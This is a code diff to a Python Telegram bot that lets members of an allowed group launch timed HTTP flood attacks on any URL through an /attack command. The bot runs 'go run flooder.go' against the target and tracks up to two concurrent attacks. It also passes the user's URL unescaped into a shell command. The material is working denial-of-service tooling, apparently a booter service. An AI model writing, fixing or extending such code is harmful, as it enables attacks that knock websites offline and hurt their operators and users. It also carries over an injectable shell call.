@@ -137,7 +137,7 @@ async def attack(update: Update, context: CallbackContext):
     threading.Thread(target=execute_attack, args=(attack_id, update)).start()
 
 # Execute Attack Function
-def execute_attack(attack_id, update):
+async def execute_attack(attack_id, update):
     attack_data = active_attacks[attack_id]
     url, duration = attack_data["url"], attack_data["remaining"]
     command = f"go run flooder.go {url} {duration}"
@@ -145,13 +145,45 @@ def execute_attack(attack_id, update):
     try:
         subprocess.run(command, shell=True, check=True)
         if update.message:
-            update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
-        asyncio.run(log_activity(f"User {update.message.from_user.id} started an attack on {url} for {duration} seconds."))
+            await update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
+        await log_activity(f"User {update.message.from_user.id} started an attack on {url} for {duration} seconds.")
     except subprocess.CalledProcessError:
         if update.message:
-            update.message.reply_text("Failed to start the attack.")
+            await update.message.reply_text("Failed to start the attack.")
     finally:
         del active_attacks[attack_id]
+
+async def attack(update: Update, context: CallbackContext):
+    if not is_allowed_group(update):
+        await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
+        return
+
+    user_id = update.message.from_user.id
+    if is_blacklisted(user_id):
+        await update.message.reply_text("You are blacklisted and cannot use this bot.")
+        return
+
+    if len(active_attacks) >= 2:
+        remaining_times = [data['remaining'] for data in active_attacks.values()]
+        min_remaining = min(remaining_times)
+        await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
+                                        f"Time left for current attacks: {min_remaining} seconds.")
+        return
+
+    try:
+        url = context.args[0]
+        duration = int(context.args[1])
+        if duration > 200:
+            duration = 200
+    except (IndexError, ValueError):
+        await update.message.reply_text("Usage: /attack <url> <duration>")
+        return
+
+    attack_id = str(user_id) + "_" + str(int(time.time()))
+    active_attacks[attack_id] = {"url": url, "remaining": duration}
+    # Create an event loop to run the async function
+    loop = asyncio.get_event_loop()
+    await loop.run_in_executor(None, lambda: asyncio.run(execute_attack(attack_id, update)))
 
 # Owner Commands
 async def blacklist(update: Update, context: CallbackContext):
